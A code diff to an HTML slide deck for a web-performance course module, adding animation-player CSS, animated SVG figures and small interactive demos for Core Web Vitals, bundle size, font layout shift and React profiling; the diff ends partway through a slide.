@@ -153,6 +153,106 @@
     animation:cxBar .5s cubic-bezier(.22,.72,.28,1) .12s both}
   .slide .card{transition:border-color .25s, transform .25s}
 
+  /* Title: the six lessons deal in once the heading has landed. */
+  @keyframes cxPop{from{opacity:0; transform:translateY(10px) scale(.92)}}
+  .pop{transform-box:fill-box; transform-origin:center}
+  .slide.on .pop{animation:cxPop .5s cubic-bezier(.2,1.3,.4,1) both; animation-delay:calc(.45s + var(--i,0) * .07s)}
+
+  /* ---- step player: a figure that plays itself when its slide opens ------------------
+     Same vocabulary as modules 4 to 6. .anim[data-at="0,900,…"] steps 1, 2, … at those times
+     (ms); R or the replay button plays it again; .anim-step[data-d="-1"|"1"] buttons
+     pause it and step by hand. The root carries s1..sN and data-step="N". On any
+     descendant: data-in="N" fades in at step N (an SVG path with pathLength=1 draws);
+     data-out="N" dims at step N; data-hl="N M" highlights while the step is N or M.
+     Until the script marks the root .live nothing is hidden, so the settled frame is
+     also what prints and what a reader without motion sees. */
+  .anim{width:100%}
+  .anim.live [data-in]{transition:opacity .45s, transform .55s cubic-bezier(.22,.72,.28,1), stroke-dashoffset .6s ease,
+    color .35s, border-color .35s, background-color .35s, fill .35s, stroke .35s}
+  .anim.live [data-in]:not(.in){opacity:0}
+  .anim.live path[data-in]{stroke-dasharray:1; stroke-dashoffset:1}
+  .anim.live path[data-in].in{stroke-dashoffset:0}
+  .anim.live [data-out].out{opacity:.3}
+  .anim [data-hl]{--hl:rgba(34,211,238,.17); border-radius:4px; -webkit-box-decoration-break:clone; box-decoration-break:clone;
+    transition:background-color .3s, box-shadow .3s}
+  .anim [data-hl].hl-g{--hl:rgba(52,211,153,.17)} .anim [data-hl].hl-r{--hl:rgba(248,113,122,.2)}
+  .anim [data-hl].hl-p{--hl:rgba(167,139,250,.22)} .anim [data-hl].hl-w{--hl:rgba(251,191,36,.17)}
+  .anim [data-hl].lit{background-color:var(--hl); box-shadow:0 0 0 3px var(--hl)}
+  .anim.rs,.anim.rs *{transition:none !important}
+  .anim-bar{display:flex; align-items:center; flex-wrap:wrap; gap:10px 14px; margin-top:10px; min-height:34px}
+  .anim-replay,.anim-step{cursor:pointer; background:var(--panel2); border:1px solid var(--line2); color:var(--ink2); border-radius:8px;
+    padding:7px 12px; font:700 11.5px/1 var(--mono); letter-spacing:1.2px; text-transform:uppercase;
+    transition:background .18s, color .18s, border-color .18s}
+  .anim-replay:hover,.anim-step:hover{background:var(--line2); color:#fff; border-color:var(--cy)}
+  .anim-step{padding:5px 10px; font:700 16px/1 var(--sans); letter-spacing:0}
+  .anim-step[aria-disabled="true"]{opacity:.35; cursor:default}
+  .anim-say{font:600 min(1.4vw,16px)/1.4 var(--sans); color:var(--ink2)}
+  .anim-say i{display:none; font-style:normal} .anim-say i.on{display:inline}
+
+  /* ---- live demos: small working pieces of UI on the slide ---------------------------
+     A .demo is self-contained. A click inside it never turns the slide, and neither do
+     Space, Enter, Tab or Escape on its controls, or any key typed into its inputs.
+     Each demo is wired by id in the demo script at the end of the deck and resets
+     whenever its slide opens. */
+  .demo{background:var(--panel); border:1px solid var(--line2); border-radius:12px; padding:11px 14px; margin-top:14px;
+    width:100%; max-width:1060px; font:min(1.45vw,15.5px)/1.4 var(--sans); color:var(--ink2)}
+  .demo.bare{background:none; border:0; padding:0; border-radius:0}
+  .demo .row{display:flex; align-items:center; flex-wrap:wrap; gap:8px 12px}
+  .demo .row + .row{margin-top:9px}
+  .demo-tag{font:700 10.5px/1 var(--mono); letter-spacing:1.6px; text-transform:uppercase; color:var(--cy)}
+  .demo-hint{font-size:.9em; color:var(--grey3)}
+  .dbtn{cursor:pointer; background:var(--panel2); border:1px solid var(--line2); color:var(--ink); border-radius:8px;
+    padding:7px 12px; font:600 12.5px/1 var(--mono); transition:background .18s, border-color .18s, color .18s}
+  .dbtn:hover{border-color:var(--cy)}
+  .dbtn:focus-visible,.dinput:focus-visible{outline:2px solid var(--cy); outline-offset:2px}
+  .dbtn.on{background:rgba(34,211,238,.14); border-color:var(--cy); color:#fff}
+  .dbtn.on.g{background:rgba(52,211,153,.14); border-color:var(--good)}
+  .dinput{background:var(--code); border:1px solid var(--line2); color:#fff; border-radius:8px; padding:7px 11px;
+    font:14.5px/1.2 var(--mono); min-width:0}
+  .dinput:focus{outline:none; border-color:var(--cy); box-shadow:0 0 0 3px rgba(34,211,238,.18)}
+  .meter{font:600 12px/1 var(--mono); color:var(--muted); white-space:nowrap}
+  .meter b{display:inline-block; min-width:2ch; margin-left:5px; color:#fff; font-size:15px}
+  .meter b.good{color:var(--good)} .meter b.bad{color:var(--bad)}
+  .dom{font:13.5px/1 var(--mono); color:var(--grey3); padding:6px 9px; border-radius:7px; border:1px dashed var(--line2)}
+  .dom b{color:#fff; font-weight:600}
+  @keyframes cxFlash{15%{box-shadow:0 0 0 4px rgba(251,191,36,.5); background-color:rgba(251,191,36,.14)}}
+  @keyframes cxFlashG{15%{box-shadow:0 0 0 4px rgba(52,211,153,.5); background-color:rgba(52,211,153,.14)}}
+  @keyframes cxFlashR{15%{box-shadow:0 0 0 4px rgba(248,113,122,.55); background-color:rgba(248,113,122,.16)}}
+  @keyframes cxBump{40%{transform:scale(1.35); color:var(--ochre)}}
+  .flash{animation:cxFlash .7s ease} .flash-g{animation:cxFlashG .7s ease} .flash-r{animation:cxFlashR .8s ease}
+  .bump{animation:cxBump .35s ease}
+
+  .meter b.mid{color:var(--ochre)}
+  .dom.ok{border-color:var(--good); color:var(--good)} .dom.no{border-color:var(--bad); color:var(--bad)}
+  .demo-hint.ok{color:var(--good)} .demo-hint.no{color:var(--bad)}
+  .demo iframe.ghost{position:absolute; width:1px; height:1px; border:0; opacity:0; pointer-events:none}
+
+  /* L1a: one tap, measured the way INP measures it, lands on the INP bar. */
+  #inp-mark{opacity:0; transition:opacity .3s, transform .5s cubic-bezier(.22,.72,.28,1)}
+  #inp-mark.on{opacity:1}
+
+  /* L2a: click a box in the treemap to fix it; main.js shrinks. */
+  #fx-bundle [data-box]{cursor:pointer}
+  #fx-bundle [data-box]:focus{outline:none}
+  #fx-bundle [data-box] rect{transition:fill .3s, fill-opacity .3s, stroke .3s, stroke-width .2s}
+  #fx-bundle [data-box] text{transition:opacity .3s}
+  #fx-bundle [data-box]:hover rect,#fx-bundle [data-box]:focus-visible rect{stroke-width:2.5}
+  #fx-bundle [data-box].out rect{fill-opacity:.03; stroke-dasharray:6 5}
+  #fx-bundle [data-box].out text{opacity:.55}
+  #fx-bundle [data-box].cut rect{fill:#34D399; stroke:#34D399}
+  #fx-bundle [data-k="main"]{transition:fill .3s}
+
+  /* L2b: the web font lands and pushes the text block down. */
+  .anim.live#fx-font .drop:not(.in){transform:translateY(-42px)}
+
+  /* L3: the memo demo dims the half of the flamegraph it isn't reproducing. */
+  #fx-prof.see-before [data-in="3"].in,#fx-prof.see-before [data-in="4"].in,#fx-prof.see-before [data-in="5"].in,
+  #fx-prof.see-after [data-in="1"].in,#fx-prof.see-after [data-in="2"].in{opacity:.25}
+
+  /* L5b: the table row the payload reads from. */
+  #tbl-store td{transition:background-color .3s}
+  #tbl-store tr.hl td{background:rgba(34,211,238,.1)}
+
   @media (prefers-reduced-motion: reduce){
     .slide.on *{animation:none !important}
     .slide .draw{stroke-dashoffset:0 !important}
@@ -288,18 +388,30 @@
     <div class="sub">Measure what users feel, fix it, prove it — then let tests and CI keep it fixed.</div>
     <div class="fig" style="max-width:980px">
       <svg viewBox="0 0 980 124" role="img" aria-label="Six lessons: Core Web Vitals and measuring, bundles images and fonts, memoization and the profiler, testing with Testing Library MSW and Playwright, XSS CSRF and CSP, and the performance budget build">
-        <rect x="0" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
-        <text x="155" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">1 · Core Web Vitals, lab vs field</text>
-        <rect x="335" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
-        <text x="490" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">2 · Bundles, images, fonts</text>
-        <rect x="670" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
-        <text x="825" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">3 · Memo &amp; the profiler</text>
-        <rect x="0" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#34D399"/>
-        <text x="155" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">4 · Testing Library, MSW, Playwright</text>
-        <rect x="335" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#F8717A"/>
-        <text x="490" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">5 · XSS, CSRF, CSP</text>
-        <rect x="670" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#FBBF24"/>
-        <text x="825" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">6 · Budget in CI · build</text>
+        <g class="pop" style="--i:0">
+          <rect x="0" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
+          <text x="155" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">1 · Core Web Vitals, lab vs field</text>
+        </g>
+        <g class="pop" style="--i:1">
+          <rect x="335" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
+          <text x="490" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">2 · Bundles, images, fonts</text>
+        </g>
+        <g class="pop" style="--i:2">
+          <rect x="670" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
+          <text x="825" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">3 · Memo &amp; the profiler</text>
+        </g>
+        <g class="pop" style="--i:3">
+          <rect x="0" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#34D399"/>
+          <text x="155" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">4 · Testing Library, MSW, Playwright</text>
+        </g>
+        <g class="pop" style="--i:4">
+          <rect x="335" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#F8717A"/>
+          <text x="490" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">5 · XSS, CSRF, CSP</text>
+        </g>
+        <g class="pop" style="--i:5">
+          <rect x="670" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#FBBF24"/>
+          <text x="825" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">6 · Budget in CI · build</text>
+        </g>
       </svg>
     </div>
 </section>
@@ -308,41 +420,67 @@
   <section class="slide" data-chip="MODULE 08 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 1</div><div class="cx-page"><b>02</b> / 23</div><!--/catalyst-brand:chrome-->
     <div class="kicker">Lesson 1 · Core Web Vitals</div>
     <h2>Three numbers for what users feel</h2>
+    <div class="anim" id="fx-cwv" data-at="200,1100,2000">
     <div class="fig" style="max-width:1000px">
       <svg viewBox="0 0 1000 204" role="img" aria-label="Thresholds: LCP good up to 2.5 seconds, poor above 4 seconds; INP good up to 200 milliseconds, poor above 500; CLS good up to 0.1, poor above 0.25">
-        <text x="0" y="36" class="lbl b" style="font-size:19px">LCP · loading</text>
-        <text x="0" y="56" class="lbl" style="font-size:13px">when the biggest element has painted</text>
-        <rect x="300" y="24" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
-        <rect x="580" y="24" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
-        <rect x="800" y="24" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
-        <text x="440" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
-        <text x="690" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
-        <text x="900" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
-        <text x="580" y="17" text-anchor="middle" class="lbl b" style="font-size:14px">2.5 s</text>
-        <text x="800" y="17" text-anchor="middle" class="lbl b" style="font-size:14px">4 s</text>
+        <g data-in="1">
+          <text x="0" y="36" class="lbl b" style="font-size:19px">LCP · loading</text>
+          <text x="0" y="56" class="lbl" style="font-size:13px">when the biggest element has painted</text>
+          <rect x="300" y="24" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
+          <rect x="580" y="24" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+          <rect x="800" y="24" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
+          <text x="440" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
+          <text x="690" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
+          <text x="900" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
+          <text x="580" y="17" text-anchor="middle" class="lbl b" style="font-size:14px">2.5 s</text>
+          <text x="800" y="17" text-anchor="middle" class="lbl b" style="font-size:14px">4 s</text>
+        </g>
 
-        <text x="0" y="106" class="lbl b" style="font-size:19px">INP · responsiveness</text>
-        <text x="0" y="126" class="lbl" style="font-size:13px">tap or key press → the next frame</text>
-        <rect x="300" y="94" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
-        <rect x="580" y="94" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
-        <rect x="800" y="94" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
-        <text x="440" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
-        <text x="690" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
-        <text x="900" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
-        <text x="580" y="87" text-anchor="middle" class="lbl b" style="font-size:14px">200 ms</text>
-        <text x="800" y="87" text-anchor="middle" class="lbl b" style="font-size:14px">500 ms</text>
+        <g data-in="2">
+          <text x="0" y="106" class="lbl b" style="font-size:19px">INP · responsiveness</text>
+          <text x="0" y="126" class="lbl" style="font-size:13px">tap or key press → the next frame</text>
+          <rect x="300" y="94" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
+          <rect x="580" y="94" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+          <rect x="800" y="94" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
+          <text x="440" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
+          <text x="690" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
+          <text x="900" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
+          <text x="580" y="87" text-anchor="middle" class="lbl b" style="font-size:14px">200 ms</text>
+          <text x="800" y="87" text-anchor="middle" class="lbl b" style="font-size:14px">500 ms</text>
+        </g>
 
-        <text x="0" y="176" class="lbl b" style="font-size:19px">CLS · stability</text>
-        <text x="0" y="196" class="lbl" style="font-size:13px">how far the page jumps, unasked</text>
-        <rect x="300" y="164" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
-        <rect x="580" y="164" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
-        <rect x="800" y="164" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
-        <text x="440" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
-        <text x="690" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
-        <text x="900" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
-        <text x="580" y="157" text-anchor="middle" class="lbl b" style="font-size:14px">0.1</text>
-        <text x="800" y="157" text-anchor="middle" class="lbl b" style="font-size:14px">0.25</text>
+        <g data-in="3">
+          <text x="0" y="176" class="lbl b" style="font-size:19px">CLS · stability</text>
+          <text x="0" y="196" class="lbl" style="font-size:13px">how far the page jumps, unasked</text>
+          <rect x="300" y="164" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
+          <rect x="580" y="164" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+          <rect x="800" y="164" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
+          <text x="440" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
+          <text x="690" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
+          <text x="900" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
+          <text x="580" y="157" text-anchor="middle" class="lbl b" style="font-size:14px">0.1</text>
+          <text x="800" y="157" text-anchor="middle" class="lbl b" style="font-size:14px">0.25</text>
+        </g>
+        <g id="inp-mark"><line x1="0" y1="91" x2="0" y2="127" stroke="#fff" stroke-width="3"/><circle cx="0" cy="91" r="4.5" fill="#fff"/></g>
       </svg>
+    </div>
+    <div class="anim-bar">
+      <button type="button" class="anim-step" data-d="-1" aria-label="Previous step">←</button>
+      <button type="button" class="anim-replay">replay</button>
+      <button type="button" class="anim-step" data-d="1" aria-label="Next step">→</button>
+      <span class="anim-say"><i>LCP: is it loading? Good when the biggest element paints by 2.5 s.</i><i>INP: did it hear me? Good when a tap gets its next frame within 200 ms.</i><i>CLS: why did that move? Good when the page shifts less than 0.1.</i></span>
+    </div>
+    </div>
+    <div class="demo bare" id="demo-inp">
+      <div class="row">
+        <span class="demo-tag">Tap, and the handler works for</span>
+        <button type="button" class="dbtn" data-w="20">20 ms</button>
+        <button type="button" class="dbtn" data-w="150">150 ms</button>
+        <button type="button" class="dbtn" data-w="350">350 ms</button>
+        <button type="button" class="dbtn" data-w="700">700 ms</button>
+        <span class="meter">this tap's INP<b data-k="ms">–</b></span>
+        <span class="demo-hint" data-k="say"></span>
+      </div>
     </div>
     <div class="key">Each one is scored at the <b>75th percentile</b> of real visits, phones and desktops separately. Pass all three at p75 and the page passes — which still allows one visit in four to be slower than that.</div>
 </section>
@@ -387,21 +525,26 @@
   <section class="slide" data-chip="MODULE 08 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 2</div><div class="cx-page"><b>05</b> / 23</div><!--/catalyst-brand:chrome-->
     <div class="kicker">Lesson 2 · Reading the bundle</div>
     <h2>Find the import that cost 300 KB</h2>
-    <div class="fig" style="max-width:1000px">
+    <div class="fig" id="fx-bundle" style="max-width:1000px">
       <svg viewBox="0 0 1000 226" role="img" aria-label="Treemap of Rasmi's main.js, 712 KB minified: rich-text editor 300 KB, react and react-dom 190 KB, app code 96 KB, every date locale 72 KB, other dependencies 54 KB">
-        <text x="0" y="14" class="lbl b" style="font-size:14px">main.js · 712 KB minified · 214 KB gzip · loaded on every page</text>
-        <rect x="2" y="26" width="415" height="196" rx="6" fill="#F8717A" fill-opacity=".16" stroke="#F8717A"/>
-        <text x="209" y="116" text-anchor="middle" class="lbl b" style="font-size:17px">Rich-text editor</text>
-        <text x="209" y="140" text-anchor="middle" class="lbl" style="font-size:14px">300 KB · used on /post-job only</text>
+        <text data-k="main" x="0" y="14" class="lbl b" style="font-size:14px">main.js · 712 KB minified · 214 KB gzip · loaded on every page</text>
+        <text x="998" y="14" text-anchor="end" class="lbl s" data-k="hint">click a box to fix it</text>
+        <g data-box="editor" tabindex="0" role="button" aria-label="Lazy-load the rich-text editor">
+          <rect x="2" y="26" width="415" height="196" rx="6" fill="#F8717A" fill-opacity=".16" stroke="#F8717A"/>
+          <text x="209" y="116" text-anchor="middle" class="lbl b" style="font-size:17px">Rich-text editor</text>
+          <text x="209" y="140" text-anchor="middle" class="lbl" style="font-size:14px">300 KB · used on /post-job only</text>
+        </g>
         <rect x="425" y="26" width="261" height="196" rx="6" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
         <text x="555" y="116" text-anchor="middle" class="lbl b" style="font-size:15px">react + react-dom</text>
         <text x="555" y="138" text-anchor="middle" class="lbl" style="font-size:13px">190 KB</text>
         <rect x="694" y="26" width="304" height="82" rx="6" fill="#34D399" fill-opacity=".14" stroke="#34D399"/>
         <text x="846" y="64" text-anchor="middle" class="lbl b" style="font-size:14px">Rasmi app code</text>
         <text x="846" y="84" text-anchor="middle" class="lbl" style="font-size:13px">96 KB</text>
-        <rect x="694" y="114" width="304" height="60" rx="6" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
-        <text x="846" y="140" text-anchor="middle" class="lbl b" style="font-size:13px">date formatting, every locale</text>
-        <text x="846" y="158" text-anchor="middle" class="lbl" style="font-size:12px">72 KB</text>
+        <g data-box="locale" tabindex="0" role="button" aria-label="Import two date locales, not all of them">
+          <rect x="694" y="114" width="304" height="60" rx="6" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+          <text x="846" y="140" text-anchor="middle" class="lbl b" style="font-size:13px">date formatting, every locale</text>
+          <text x="846" y="158" text-anchor="middle" class="lbl" style="font-size:12px">72 KB</text>
+        </g>
         <rect x="694" y="180" width="304" height="42" rx="6" fill="#121C30" stroke="#64748B"/>
         <text x="846" y="206" text-anchor="middle" class="lbl" style="font-size:12px">other dependencies · 54 KB</text>
       </svg>
@@ -450,27 +593,39 @@ $ npx source-map-explorer <span class="st">'dist/assets/*.js'</span></code></pre
     <div class="kicker">Lesson 2 · Fonts and the CLS score</div>
     <h2>A late font moves text that already painted</h2>
     <div class="two tight" style="max-width:1240px">
-      <div class="fig" style="margin:0">
+      <div class="fig anim" id="fx-font" data-at="300,1300,2300,3100,3900" style="margin:0">
         <svg viewBox="0 0 560 300" role="img" aria-label="A content block moves down 42 pixels in a 280 pixel viewport when the web font swaps in. Impact fraction 0.51 times distance fraction 0.15 gives a layout shift score of 0.08">
           <rect x="10" y="10" width="200" height="280" rx="10" fill="#0E1525" stroke="#243349"/>
           <rect x="24" y="24" width="150" height="10" rx="3" fill="#243349"/>
           <rect x="24" y="40" width="100" height="10" rx="3" fill="#243349"/>
-          <rect x="22" y="60" width="176" height="100" rx="6" fill="none" stroke="#64748B" stroke-dasharray="5 4"/>
-          <text x="110" y="80" text-anchor="middle" class="lbl s">before · fallback font</text>
-          <rect x="22" y="102" width="176" height="100" rx="6" fill="#2196F3" fill-opacity=".16" stroke="#2196F3"/>
-          <text x="110" y="186" text-anchor="middle" class="lbl s" style="fill:#CBD5E1">after · Inter swapped in</text>
-          <path d="M184,64 L184,98" stroke="#FBBF24" stroke-width="2" fill="none"/>
-          <line x1="222" y1="60" x2="222" y2="202" stroke="#22D3EE"/>
-          <line x1="216" y1="60" x2="228" y2="60" stroke="#22D3EE"/>
-          <line x1="216" y1="202" x2="228" y2="202" stroke="#22D3EE"/>
+          <g data-in="1">
+            <rect x="22" y="60" width="176" height="100" rx="6" fill="none" stroke="#64748B" stroke-dasharray="5 4"/>
+            <text x="110" y="80" text-anchor="middle" class="lbl s">before · fallback font</text>
+          </g>
+          <g class="drop" data-in="2">
+            <rect x="22" y="102" width="176" height="100" rx="6" fill="#2196F3" fill-opacity=".16" stroke="#2196F3"/>
+            <text x="110" y="186" text-anchor="middle" class="lbl s" style="fill:#CBD5E1">after · Inter swapped in</text>
+          </g>
+          <path pathLength="1" data-in="2" d="M184,64 L184,98" stroke="#FBBF24" stroke-width="2" fill="none"/>
+          <g data-in="3">
+            <line x1="222" y1="60" x2="222" y2="202" stroke="#22D3EE"/>
+            <line x1="216" y1="60" x2="228" y2="60" stroke="#22D3EE"/>
+            <line x1="216" y1="202" x2="228" y2="202" stroke="#22D3EE"/>
+          </g>
           <text x="110" y="280" text-anchor="middle" class="lbl s">viewport · 280 px tall</text>
-          <text x="250" y="66" class="lbl b" style="font-size:14px">impact fraction</text>
-          <text x="250" y="86" class="lbl" style="font-size:13px">before ∪ after: 142 of 280 px → 0.51</text>
-          <text x="250" y="126" class="lbl b" style="font-size:14px">distance fraction</text>
-          <text x="250" y="146" class="lbl" style="font-size:13px">moved 42 of 280 px → 0.15</text>
-          <text x="250" y="196" class="lbl b" style="font-size:14px">layout shift score</text>
-          <text x="250" y="226" class="lbl b" style="font-size:24px; fill:#FBBF24">0.51 × 0.15 = 0.08</text>
-          <text x="250" y="252" class="lbl" style="font-size:13px; fill:#F8717A">most of a 0.1 budget, from one font</text>
+          <g data-in="3">
+            <text x="250" y="66" class="lbl b" style="font-size:14px">impact fraction</text>
+            <text x="250" y="86" class="lbl" style="font-size:13px">before ∪ after: 142 of 280 px → 0.51</text>
+          </g>
+          <g data-in="4">
+            <text x="250" y="126" class="lbl b" style="font-size:14px">distance fraction</text>
+            <text x="250" y="146" class="lbl" style="font-size:13px">moved 42 of 280 px → 0.15</text>
+          </g>
+          <g data-in="5">
+            <text x="250" y="196" class="lbl b" style="font-size:14px">layout shift score</text>
+            <text x="250" y="226" class="lbl b" style="font-size:24px; fill:#FBBF24">0.51 × 0.15 = 0.08</text>
+            <text x="250" y="252" class="lbl" style="font-size:13px; fill:#F8717A">most of a 0.1 budget, from one font</text>
+          </g>
         </svg>
       </div>
       <pre style="margin-top:0"><code><span class="kw">@font-face</span> {
@@ -552,27 +707,61 @@ $ npx source-map-explorer <span class="st">'dist/assets/*.js'</span></code></pre
   <section class="slide" data-chip="MODULE 08 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 3</div><div class="cx-page"><b>10</b> / 23</div><!--/catalyst-brand:chrome-->
     <div class="kicker">Lesson 3 · The profiler proves it</div>
     <h2>Record one click, read the commit</h2>
+    <div class="anim" id="fx-prof" data-at="200,1000,1900,2700,3500">
     <div class="fig" style="max-width:1000px">
       <svg viewBox="0 0 1000 214" role="img" aria-label="React profiler flamegraph. Before: commit 42 ms, App, JobList and 120 JobCards all render. After: commit 5 ms, 2 JobCards render and 118 are skipped">
-        <text x="0" y="28" class="lbl b" style="font-size:16px">Before</text>
-        <text x="0" y="50" class="lbl" style="font-size:14px; fill:#F8717A">commit 42 ms</text>
-        <rect x="150" y="8" width="850" height="26" rx="4" fill="#2196F3" fill-opacity=".22" stroke="#2196F3"/>
-        <text x="162" y="26" class="lbl b" style="font-size:12px">App · 42 ms</text>
-        <rect x="150" y="38" width="830" height="26" rx="4" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
-        <text x="162" y="56" class="lbl b" style="font-size:12px">JobList · 41 ms</text>
-        <rect x="150" y="68" width="810" height="26" rx="4" fill="#FBBF24" fill-opacity=".2" stroke="#FBBF24"/>
-        <text x="162" y="86" class="lbl b" style="font-size:12px">JobCard × 120 · every one rendered</text>
+        <g data-in="1">
+          <text x="0" y="28" class="lbl b" style="font-size:16px">Before</text>
+        </g>
+        <g data-in="2">
+          <text x="0" y="50" class="lbl" style="font-size:14px; fill:#F8717A">commit 42 ms</text>
+        </g>
+        <g data-in="1">
+          <rect x="150" y="8" width="850" height="26" rx="4" fill="#2196F3" fill-opacity=".22" stroke="#2196F3"/>
+          <text x="162" y="26" class="lbl b" style="font-size:12px">App · 42 ms</text>
+          <rect x="150" y="38" width="830" height="26" rx="4" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
+          <text x="162" y="56" class="lbl b" style="font-size:12px">JobList · 41 ms</text>
+        </g>
+        <g data-in="2">
+          <rect x="150" y="68" width="810" height="26" rx="4" fill="#FBBF24" fill-opacity=".2" stroke="#FBBF24"/>
+          <text x="162" y="86" class="lbl b" style="font-size:12px">JobCard × 120 · every one rendered</text>
+        </g>
 
-        <text x="0" y="142" class="lbl b" style="font-size:16px">After</text>
-        <text x="0" y="164" class="lbl" style="font-size:14px; fill:#34D399">commit 5 ms</text>
-        <rect x="150" y="122" width="101" height="26" rx="4" fill="#2196F3" fill-opacity=".22" stroke="#2196F3"/>
-        <text x="262" y="140" class="lbl b" style="font-size:12px">App · 5 ms</text>
-        <rect x="150" y="152" width="97" height="26" rx="4" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
-        <text x="262" y="170" class="lbl b" style="font-size:12px">JobList · 4.8 ms</text>
-        <rect x="150" y="182" width="16" height="26" rx="3" fill="#34D399" fill-opacity=".3" stroke="#34D399"/>
-        <rect x="172" y="182" width="680" height="26" rx="4" fill="none" stroke="#64748B" stroke-dasharray="4 4"/>
-        <text x="184" y="200" class="lbl" style="font-size:12px">JobCard × 2 rendered · × 118 grey: did not render</text>
+        <g data-in="3">
+          <text x="0" y="142" class="lbl b" style="font-size:16px">After</text>
+        </g>
+        <g data-in="5">
+          <text x="0" y="164" class="lbl" style="font-size:14px; fill:#34D399">commit 5 ms</text>
+        </g>
+        <g data-in="3">
+          <rect x="150" y="122" width="101" height="26" rx="4" fill="#2196F3" fill-opacity=".22" stroke="#2196F3"/>
+          <text x="262" y="140" class="lbl b" style="font-size:12px">App · 5 ms</text>
+          <rect x="150" y="152" width="97" height="26" rx="4" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
+          <text x="262" y="170" class="lbl b" style="font-size:12px">JobList · 4.8 ms</text>
+        </g>
+        <g data-in="4">
+          <rect x="150" y="182" width="16" height="26" rx="3" fill="#34D399" fill-opacity=".3" stroke="#34D399"/>
+          <rect x="172" y="182" width="680" height="26" rx="4" fill="none" stroke="#64748B" stroke-dasharray="4 4"/>
+          <text x="184" y="200" class="lbl" style="font-size:12px">JobCard × 2 rendered · × 118 grey: did not render</text>
+        </g>
       </svg>
+    </div>
+    <div class="anim-bar">
